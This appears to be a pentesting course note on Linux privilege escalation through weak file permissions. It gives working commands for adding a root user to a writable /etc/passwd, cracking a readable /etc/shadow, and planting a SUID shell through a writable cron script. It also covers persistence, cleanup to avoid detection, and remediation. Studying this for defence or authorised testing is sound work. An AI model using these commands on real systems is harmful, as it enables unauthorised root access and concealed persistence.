---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.15 Weak File Permissions"
---

# 44.15 Weak File Permissions on Sensitive Files

## 1. Introduction

Weak file permissions remain one of the most prevalent and easiest-to-exploit avenues for local privilege escalation on Linux systems. Despite the maturity of Linux security models, human error, misconfigured deployment scripts, and poorly packaged software often lead to sensitive files being readable or writable by unprivileged users. 

When a standard user can read a sensitive file containing credentials or configuration secrets, or write to an executable, library, or configuration file loaded by a privileged process, the entire security boundary of the operating system can be compromised. This note delves deeply into the mechanics, enumeration, and exploitation of weak file permissions, focusing on critical system files and directories.

## 2. Core Concepts and Underlying Mechanisms

Linux uses a standard Discretionary Access Control (DAC) model based on User, Group, and Other (UGO) permissions, supplemented by Access Control Lists (ACLs). 

### 2.1 The UGO Model
Every file and directory has an owner user and an owner group. Permissions are defined as Read (r=4), Write (w=2), and Execute (x=1). 
A permission set like `rw-r--r--` (644) means the owner can read/write, while the group and others can only read.
When an administrator accidentally sets permissions too broadly (e.g., `chmod 777` or `chmod 666`), they inadvertently grant all users on the system full read/write access.

### 2.2 Critical System Files
Certain files are integral to the system's authentication and authorization mechanisms:
- `/etc/passwd`: Maps usernames to User IDs (UIDs) and specifies the user's home directory and default shell. Historically contained password hashes.
- `/etc/shadow`: Contains the actual hashed passwords for user accounts. Must only be readable by root (or the `shadow` group).
- `/etc/sudoers`: Defines which users can execute commands as root or other users via the `sudo` command.
- `/root/` and `/root/.ssh/`: The root user's home directory and SSH configuration/keys.

## 3. Technical Breakdown and Architecture

The following diagram illustrates the flow of exploitation when a sensitive file like `/etc/passwd` is globally writable.

```text
+-------------------------------------------------------------------------+
|                    WEAK PERMISSIONS ATTACK ARCHITECTURE                 |
|                                                                         |
|  [ Unprivileged User 'bob' ]                                            |
|              |                                                          |
|              v (Checks permissions)                                     |
|      $ ls -la /etc/passwd                                               |
|      -rw-rw-rw- 1 root root 1.2K Oct 10 09:00 /etc/passwd               |
|              |                                                          |
|              +--[ Writable! ]--> Generates new user with crypt() hash   |
|                                  e.g., 'evil:$6$salt$hash:0:0::/root:/bin/bash'
|                                                                         |
|              v (Appends to file)                                        |
|      $ echo "evil:..." >> /etc/passwd                                   |
|              |                                                          |
|              +-----------------------------------+                      |
|                                                  |                      |
|  [ Linux Auth System (PAM/login/su) ] <----------+                      |
|  Reads /etc/passwd for uid 0 (root) mappings                            |
|                                                                         |
|              v                                                          |
|      $ su evil                                                          |
|      # id -> uid=0(root) gid=0(root)                                    |
|                                                                         |
+-------------------------------------------------------------------------+
```

As seen in the diagram, writing to a sensitive file allows an attacker to manipulate the underlying data source the operating system relies on for user management.

## 4. Enumeration Strategy

Enumeration is the key to identifying weak file permissions. We can use built-in tools like `find` and `ls` to locate misconfigurations.

### 4.1 Manual Enumeration with Find
To find world-writable files (excluding `/proc` and `/sys` to reduce noise):
```bash
find / -type f -perm -0002 -ls 2>/dev/null | grep -v "/proc\|/sys"
```

To find world-readable files in sensitive directories like `/etc` or `/var/log`:
```bash
find /etc -type f -perm -0004 -ls 2>/dev/null
```

### 4.2 Targeted Checks
Always explicitly check the permissions of the holy trinity of Linux files:
```bash
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
ls -la /etc/exports
```

Additionally, check for readable private SSH keys across the filesystem:
```bash
find / -type f -name "id_rsa" -perm -0004 2>/dev/null
```

### 4.3 Automated Tools
Tools like LinPEAS and LinEnum will automatically flag world-writable files and world-readable sensitive files. Pay close attention to the "Interesting Files" or "Software Information" sections in LinPEAS output.

## 5. Exploitation Methodology

Exploitation depends entirely on the file and whether we have read or write access.

### 5.1 Scenario A: Writable /etc/passwd
If `/etc/passwd` is writable, we can add a new root user. The `/etc/passwd` file structure is `username:password:UID:GID:GECOS:home_dir:shell`. 
If the password field contains an actual hash instead of an `x` (which tells the system to look in `/etc/shadow`), the system will authenticate using the hash in `/etc/passwd`.

1. Generate a password hash using `openssl`:
```bash
openssl passwd -1 -salt evil password
# Output: $1$evil$8F59...
```
2. Append a new root user to `/etc/passwd`:
```bash
echo 'evil:$1$evil$8F59...:0:0:root:/root:/bin/bash' >> /etc/passwd
```
3. Switch to the new user:
```bash
su evil
```
You are now root.

### 5.2 Scenario B: Readable /etc/shadow
If `/etc/shadow` is readable, we can extract the root password hash and attempt to crack it offline.

1. Cat the file and copy the root hash:
```bash
cat /etc/shadow | grep root
# Output: root:$6$xyz...:18000:0:99999:7:::
```
2. Unshadow the files on your local machine (if you also have `/etc/passwd`):
```bash
unshadow passwd shadow > hashes.txt
```
3. Crack with Hashcat:
```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```
If the password is weak, you will recover it and can simply `su root`.

### 5.3 Scenario C: Writable Cron Job Files
If an unprivileged user can write to a file executed by a root cron job (e.g., `/etc/cron.d/*` or a script in `/etc/cron.hourly/`), they can inject malicious code.

1. Append a reverse shell or a command to make a root SUID binary:
```bash
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /usr/local/bin/backup_script.sh
```
2. Wait for the cron job to run.
3. Execute the SUID binary:
```bash
/tmp/rootbash -p
```

## 6. Edge Cases and Bypasses

Sometimes, a file is not globally writable, but it is writable by a specific group that our compromised user is a part of. Always check your group memberships with the `id` command.
Additionally, check for ACLs using `getfacl`. A file might appear as `-rw-r--r--+`, but the `+` indicates ACLs are present, which might grant your specific user write access.
```bash
getfacl /etc/shadow
```

## 7. Post-Exploitation & Persistence

Once root access is achieved via weak permissions, the attacker typically establishes persistence.
- Add an SSH key to `/root/.ssh/authorized_keys`.
- Create a hidden SUID binary (`cp /bin/bash /var/tmp/.bash && chmod 4755 /var/tmp/.bash`).
- Modify system startup scripts (`/etc/rc.local` or systemd service files).

It is also crucial to clean up the modifications made during exploitation (e.g., removing the injected user from `/etc/passwd`) to avoid detection.

## 8. Defense & Remediation

System administrators must adhere to the principle of least privilege.
- Ensure strict file permissions on all `/etc/` configurations.
- Use tools like `chmod` and `chown` to correct misconfigurations:
  ```bash
  chmod 644 /etc/passwd
  chmod 600 /etc/shadow
  chown root:root /etc/passwd /etc/shadow
  ```
- Regularly audit file permissions using configuration management tools (Ansible, Puppet, Chef) or vulnerability scanners.
- Monitor file integrity using tools like AIDE or Tripwire.
- Alert on unexpected modifications to `/etc/passwd` and `/etc/shadow`.

## 9. Chaining Opportunities

Weak file permissions rarely exist in isolation and often serve as the crucial link in an attack chain:
- **Web Exploitation to PrivEsc**: A web vulnerability (LFI, RCE) grants a low-privileged shell (`www-data`). The attacker then discovers a readable `/etc/shadow` or writable cron job script to elevate to root.
- **Container Escapes**: Misconfigured permissions inside a container might allow the modification of a file that is mapped from the host via a volume mount, leading to host compromise.
- **Service Account Abuse**: A compromised service account (e.g., Jenkins, Docker) may have write access to deployment scripts that are later executed by root.

## 10. Related Notes
- [[01 - SUID and SGID Binaries]]
- [[02 - Sudo Misconfigurations]]
- [[12 - Cron Jobs Privilege Escalation]]
- [[16 - Password in Config Files History Env Vars]]

